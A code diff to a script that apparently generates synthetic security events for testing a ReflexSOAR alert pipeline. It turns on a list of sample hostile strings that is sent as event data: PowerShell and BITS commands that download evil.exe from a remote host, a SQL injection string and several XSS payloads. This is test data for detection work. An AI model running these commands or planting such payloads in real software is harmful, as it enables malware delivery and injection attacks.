@@ -87,18 +87,19 @@ def random_host_name():
 def random_username():
   users = [
     'svc_justin',
-    #'bro',
-    #'joe',
-    #'jonathan',
-    #'dave',
-    #'molly',
-    #'stevie',
-    #'justin',
-    #'josh',
-    #'adam',
-    #'matthew',
-    #'administrator',
-    #'system'
+    'bro',
+    'joe',
+    'jonathan',
+    'dave',
+    'molly',
+    'stevie',
+    'justin',
+    'josh',
+    'adam',
+    'matthew',
+    'administrator',
+    'system',
+    'brian'
   ]
 
   return users[random.randint(0, len(users)-1)]
@@ -119,15 +120,15 @@ def random_ip():
 
 def random_powershell_command():
   commands = [
-    #'powershell -c "(New-Object System.Net.WebClient).Downloadfile(\'https://reflexsoar.com/evil.exe\',C:/temp/evil.exe)"',
-    #'Start-BitsTransfer -Source https://reflexsoar.com/evil.exe -Destination C:/temp/evil.exe -Asynchronous',
-    #'administrator") OR 1=1 --;',
-    #'alert(1);',
-    #'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
-    #'<IMG SRC="javascript:alert(\'XSS\');">',
-    #'<IMG SRC=javascript:alert(\'XSS\')>',
-    #'<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
-    #'<script>alert(\'xss\')</script>'
+    'powershell -c "(New-Object System.Net.WebClient).Downloadfile(\'https://reflexsoar.com/evil.exe\',C:/temp/evil.exe)"',
+    'Start-BitsTransfer -Source https://reflexsoar.com/evil.exe -Destination C:/temp/evil.exe -Asynchronous',
+    'administrator") OR 1=1 --;',
+    'alert(1);',
+    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
+    '<IMG SRC="javascript:alert(\'XSS\');">',
+    '<IMG SRC=javascript:alert(\'XSS\')>',
+    '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
+    '<script>alert(\'xss\')</script>'
     '<iframe src="http://docs.reflexsoar.com/en/latest/"/>'
   ]
 
@@ -257,7 +258,7 @@ def random_event():
 
 while True:
   events = []
-  for i in range(0,5):
+  for i in range(0,100):
     headers = {
       'Content-Type': 'application/json'
     }
@@ -271,5 +272,4 @@ while True:
 
   print("Sending {} events...".format(len(events)))
   bulk(events)
-  time.sleep(5)
-  break
+  time.sleep(1)
